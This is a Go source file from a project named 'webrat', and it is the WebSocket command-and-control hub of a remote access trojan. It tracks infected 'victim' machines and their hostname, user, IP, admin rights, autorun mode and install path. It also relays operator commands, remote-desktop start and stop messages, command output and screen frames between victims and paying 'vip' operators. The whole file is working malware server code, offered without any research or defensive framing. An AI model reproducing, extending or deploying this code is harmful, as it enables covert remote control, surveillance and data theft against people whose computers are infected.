package ws

import (
	"encoding/json"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"webrat-go-api/internal/storage"

	"github.com/gorilla/websocket"
)

type Hub struct {
	db *storage.DB

	mu               sync.RWMutex
	victims           map[string]*storage.Victim
	clients           map[*websocket.Conn]bool
	clientOwners      map[*websocket.Conn]string
	victimSockets     map[string]*websocket.Conn
	victimOwnersByConn map[*websocket.Conn]string
	bannedVictimIDs   map[string]bool
	hiddenVictimIDs   map[string]map[string]bool

	connMu    sync.Mutex
	connWrite map[*websocket.Conn]*sync.Mutex

	lim limiter

	upgrader websocket.Upgrader
}

func NewHub(db *storage.DB) (*Hub, error) {
	h := &Hub{
		db:                db,
		victims:            make(map[string]*storage.Victim),
		clients:            make(map[*websocket.Conn]bool),
		clientOwners:       make(map[*websocket.Conn]string),
		victimSockets:      make(map[string]*websocket.Conn),
		victimOwnersByConn: make(map[*websocket.Conn]string),
		bannedVictimIDs:    make(map[string]bool),
		hiddenVictimIDs:    make(map[string]map[string]bool),
		connWrite:          make(map[*websocket.Conn]*sync.Mutex),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return isAllowedOrigin(r) },
		},
	}

	if db != nil {
		victims, err := db.LoadVictimsFromDB()
		if err != nil {
			return nil, err
		}
		h.mu.Lock()
		for _, v := range victims {
			if v == nil {
				continue
			}
			id := strings.TrimSpace(v.ID)
			if id == "" {
				continue
			}
			vv := *v
			h.victims[id] = &vv
		}
		h.mu.Unlock()

		hidden, err := db.LoadHiddenVictims()
		if err != nil {
			return nil, err
		}
		banned, err := db.LoadBannedVictimIDs()
		if err != nil {
			return nil, err
		}

		h.mu.Lock()
		h.hiddenVictimIDs = hidden
		for _, id := range banned {
			id = strings.TrimSpace(id)
			if id != "" {
				h.bannedVictimIDs[id] = true
			}
		}
		h.mu.Unlock()
	}

	h.startCleanup()
	return h, nil
}

func (h *Hub) getConnMutex(c *websocket.Conn) *sync.Mutex {
	if c == nil {
		m := &sync.Mutex{}
		return m
	}
	h.connMu.Lock()
	defer h.connMu.Unlock()
	m := h.connWrite[c]
	if m != nil {
		return m
	}
	m = &sync.Mutex{}
	h.connWrite[c] = m
	return m
}

func (h *Hub) broadcastVictims() {
	h.mu.RLock()
	clients := make([]*websocket.Conn, 0, len(h.clients))
	owners := make([]string, 0, len(h.clients))
	for c := range h.clients {
		clients = append(clients, c)
		owners = append(owners, strings.TrimSpace(h.clientOwners[c]))
	}
	h.mu.RUnlock()

	if len(clients) == 0 {
		return
	}

	for i, c := range clients {
		owner := strings.ToLower(strings.TrimSpace(owners[i]))
		h.mu.RLock()
		list := make([]*storage.Victim, 0, len(h.victims))
		hidden := h.hiddenVictimIDs[owner]
		for _, v := range h.victims {
			if owner != "" && strings.ToLower(strings.TrimSpace(v.Owner)) != owner {
				continue
			}
			if hidden != nil {
				if hidden[strings.TrimSpace(v.ID)] {
					continue
				}
			}
			vv := *v
			list = append(list, &vv)
		}
		h.mu.RUnlock()

		payload := map[string]any{
			"type":    "victims",
			"victims": list,
		}
		data, err := json.Marshal(payload)
		if err != nil {
			continue
		}

		m := h.getConnMutex(c)
		m.Lock()
		_ = c.SetWriteDeadline(time.Now().Add(15 * time.Second))
		if err := c.WriteMessage(websocket.TextMessage, data); err != nil {
			log.Println("broadcastVictims write:", err)
		}
		m.Unlock()
	}
}

func (h *Hub) HandleHTTP(w http.ResponseWriter, r *http.Request) {
	ip := getClientIP(r)
	ok := h.lim.allowUpgrade(ip)
	if !ok {
		w.WriteHeader(http.StatusTooManyRequests)
		return
	}
	defer h.lim.release(ip)

	panelLogin := ""
	if h.db != nil {
		panelLogin = getPanelLogin(h.db, r)
	}

	ownerLogin := ""
	token := strings.TrimSpace(r.Header.Get("X-Builder-Token"))
	if token != "" && h.db != nil {
		if login, ok, err := h.db.GetLoginByBuilderToken(token); err == nil && ok {
			ownerLogin = strings.ToLower(strings.TrimSpace(login))
		}
	}

	if panelLogin != "" && !isAllowedOrigin(r) {
		w.WriteHeader(http.StatusForbidden)
		return
	}
	if panelLogin != "" && h.db != nil {
		status, _, _, err := h.db.GetSubscription(panelLogin)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		if status != "vip" {
			w.WriteHeader(http.StatusForbidden)
			return
		}
	}
	if ownerLogin != "" && h.db != nil {
		_, _, _, _ = h.db.GetSubscription(ownerLogin)
	}

	ws, err := h.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	stopPing := make(chan struct{})
	defer close(stopPing)

	ws.SetReadLimit(64 * 1024)
	_ = ws.SetReadDeadline(time.Now().Add(5 * time.Minute))
	ws.SetPongHandler(func(string) error {
		_ = ws.SetReadDeadline(time.Now().Add(5 * time.Minute))
		return nil
	})

	associatedVictimID := ""

	go func() {
		t := time.NewTicker(25 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-stopPing:
				return
			case <-t.C:
				if panelLogin != "" && h.db != nil {
					status, _, _, err := h.db.GetSubscription(panelLogin)
					if err != nil || status != "vip" {
						_ = ws.Close()
						return
					}
				}
				m := h.getConnMutex(ws)
				m.Lock()
				_ = ws.SetWriteDeadline(time.Now().Add(15 * time.Second))
				err := ws.WriteControl(websocket.PingMessage, []byte("ping"), time.Now().Add(15*time.Second))
				m.Unlock()
				if err != nil {
					_ = ws.Close()
					return
				}
			}
		}
	}()

	if panelLogin != "" {
		h.mu.Lock()
		h.clients[ws] = true
		h.clientOwners[ws] = panelLogin
		h.mu.Unlock()
		h.broadcastVictims()
	}

	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			break
		}
		_ = ws.SetReadDeadline(time.Now().Add(5 * time.Minute))

		if !h.lim.allowMessage(ip) {
			m := h.getConnMutex(ws)
			m.Lock()
			_ = ws.SetWriteDeadline(time.Now().Add(2 * time.Second))
			_ = ws.WriteControl(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.ClosePolicyViolation, "rate limit"), time.Now().Add(2*time.Second))
			m.Unlock()
			break
		}

		var payload map[string]any
		if err := json.Unmarshal(message, &payload); err != nil {
			continue
		}

		typeVal := strFrom(payload["type"])
		switch typeVal {
		case "register":
			id := strFrom(payload["id"])
			if id == "" {
				continue
			}
			if strings.TrimSpace(token) == "" || strings.TrimSpace(ownerLogin) == "" {
				_ = ws.Close()
				continue
			}

			h.mu.RLock()
			banned := h.bannedVictimIDs[id]
			h.mu.RUnlock()
			if h.db != nil {
				if ok, err := h.db.IsVictimBanned(id); err == nil {
					if ok {
						banned = true
						h.mu.Lock()
						h.bannedVictimIDs[id] = true
						h.mu.Unlock()
					} else if banned {
						h.mu.Lock()
						delete(h.bannedVictimIDs, id)
						h.mu.Unlock()
						banned = false
					}
				}
			}
			if banned {
				_ = ws.Close()
				continue
			}

			resolvedOwner := strings.TrimSpace(ownerLogin)
			if resolvedOwner == "" {
				resolvedOwner = strings.ToLower(strings.TrimSpace(strFrom(payload["owner"])))
			}
			if resolvedOwner == "" {
				_ = ws.Close()
				continue
			}
			if h.db != nil {
				status, _, _, err := h.db.GetSubscription(resolvedOwner)
				if err != nil || status != "vip" {
					_ = ws.Close()
					continue
				}
			}
			ownerLogin = resolvedOwner

			if !h.lim.allowRegister(ownerLogin, ip) {
				m := h.getConnMutex(ws)
				m.Lock()
				_ = ws.SetWriteDeadline(time.Now().Add(2 * time.Second))
				_ = ws.WriteControl(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.ClosePolicyViolation, "rate limit"), time.Now().Add(2*time.Second))
				m.Unlock()
				_ = ws.Close()
				continue
			}

			v := &storage.Victim{
				ID:           id,
				Hostname:     strFrom(payload["hostname"]),
				User:         strFrom(payload["user"]),
				IP:           strFrom(payload["ip"]),
				Comment:      strFrom(payload["comment"]),
				BuildID:      strFrom(payload["buildId"]),
				OS:           strFrom(payload["os"]),
				CPU:          strFrom(payload["cpu"]),
				GPU:          strFrom(payload["gpu"]),
				RAM:          strFrom(payload["ram"]),
				Country:      strFrom(payload["country"]),
				DeviceType:   strFrom(payload["deviceType"]),
				Admin:        boolFrom(payload["admin"]),
				Owner:        ownerLogin,
				LastActive:   time.Now(),
				Online:       true,
				BuildVersion: strFrom(payload["version"]),
				AutorunMode:  strFrom(payload["autorunMode"]),
				InstallPath:  strFrom(payload["installPath"]),
				HideFilesEnabled: boolFrom(payload["hideFilesEnabled"]),
			}
			if delayVal, ok := payload["startupDelaySeconds"]; ok {
				if f, ok2 := delayVal.(float64); ok2 {
					v.StartupDelaySeconds = int(f)
				}
			}

			associatedVictimID = id

			if h.db != nil {
				_ = h.db.UpsertVictim(v)
			}

			h.mu.Lock()
			h.victims[id] = v
			h.victimSockets[id] = ws
			h.victimOwnersByConn[ws] = strings.ToLower(strings.TrimSpace(v.Owner))
			h.mu.Unlock()

			h.broadcastVictims()

		case "update":
			id := strFrom(payload["id"])
			if id == "" {
				continue
			}
			windowTitle := strFrom(payload["window"])

			var victimCopy *storage.Victim
			h.mu.Lock()
			if v, ok := h.victims[id]; ok {
				v.Window = windowTitle
				v.LastActive = time.Now()
				v.Online = true
				vv := *v
				victimCopy = &vv
			}
			h.mu.Unlock()

			if victimCopy != nil && h.db != nil {
				now := time.Now()
				if h.lim.shouldPersist(id, now) {
					_ = h.db.UpsertVictim(victimCopy)
				}
			}

			h.broadcastVictims()

		case "ping":
			var victimCopy *storage.Victim
			pingVictimID := ""
			h.mu.Lock()
			if associatedVictimID != "" {
				if v, ok := h.victims[associatedVictimID]; ok {
					if h.victimSockets[associatedVictimID] == ws {
						now := time.Now()
						v.LastActive = now
						v.Online = true
						vv := *v
						victimCopy = &vv
						pingVictimID = associatedVictimID
					}
				}
			}
			if victimCopy == nil {
				for id, c := range h.victimSockets {
					if c == ws {
						if v, ok := h.victims[id]; ok {
							now := time.Now()
							v.LastActive = now
							v.Online = true
							vv := *v
							victimCopy = &vv
							pingVictimID = id
							break
						}
					}
				}
			}
			h.mu.Unlock()

			if victimCopy != nil && h.db != nil {
				now := time.Now()
				if h.lim.shouldPersist(pingVictimID, now) {
					_ = h.db.UpsertVictim(victimCopy)
				}
			}

		case "command", "rd_start", "rd_stop":
			if panelLogin == "" {
				continue
			}
			if h.db != nil {
				status, _, _, err := h.db.GetSubscription(panelLogin)
				if err != nil || status != "vip" {
					_ = ws.Close()
					break
				}
			}
			victimID := strFrom(payload["victim_id"])
			if victimID == "" {
				continue
			}

			h.mu.RLock()
			v := h.victims[victimID]
			h.mu.RUnlock()
			if v == nil || strings.ToLower(strings.TrimSpace(v.Owner)) != strings.ToLower(strings.TrimSpace(panelLogin)) {
				continue
			}

			h.mu.RLock()
			victimConn := h.victimSockets[victimID]
			h.mu.RUnlock()
			if victimConn == nil {
				continue
			}

			b, err := json.Marshal(payload)
			if err != nil {
				continue
			}
			m := h.getConnMutex(victimConn)
			m.Lock()
			_ = victimConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
			_ = victimConn.WriteMessage(websocket.TextMessage, b)
			m.Unlock()

		case "cmd_output":
			b, err := json.Marshal(payload)
			if err != nil {
				continue
			}
			h.mu.RLock()
			for clientConn := range h.clients {
				owner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
				victOwner := strings.ToLower(strings.TrimSpace(h.victimOwnersByConn[ws]))
				if owner == "" || owner != victOwner {
					continue
				}
				m := h.getConnMutex(clientConn)
				m.Lock()
				_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
				_ = clientConn.WriteMessage(websocket.TextMessage, b)
				m.Unlock()
			}
			h.mu.RUnlock()

		case "rd_frame":
			victID := associatedVictimID
			if victID == "" {
				h.mu.RLock()
				for id, c := range h.victimSockets {
					if c == ws {
						victID = id
						break
					}
				}
				h.mu.RUnlock()
			}
			if victID == "" {
				continue
			}
			payload["victim_id"] = victID
			b, err := json.Marshal(payload)
			if err != nil {
				continue
			}
			h.mu.RLock()
			for clientConn := range h.clients {
				owner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
				victOwner := strings.ToLower(strings.TrimSpace(h.victimOwnersByConn[ws]))
				if owner == "" || owner != victOwner {
					continue
				}
				m := h.getConnMutex(clientConn)
				m.Lock()
				_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
				_ = clientConn.WriteMessage(websocket.TextMessage, b)
				m.Unlock()
			}
			h.mu.RUnlock()
		}
	}

	h.mu.Lock()
	delete(h.clients, ws)
	delete(h.clientOwners, ws)
	delete(h.victimOwnersByConn, ws)

	var toOffline []*storage.Victim
	for id, c := range h.victimSockets {
		if c == ws {
			if v, ok := h.victims[id]; ok {
				v.Online = false
				v.LastActive = time.Now()
				vv := *v
				toOffline = append(toOffline, &vv)
			}
			delete(h.victimSockets, id)
		}
	}
	h.mu.Unlock()

	for _, v := range toOffline {
		if h.db != nil {
			_ = h.db.UpsertVictim(v)
		}
	}
	if len(toOffline) > 0 {
		h.broadcastVictims()
	}

	_ = os.Getenv("WEBRAT_DEBUG_WS")
}
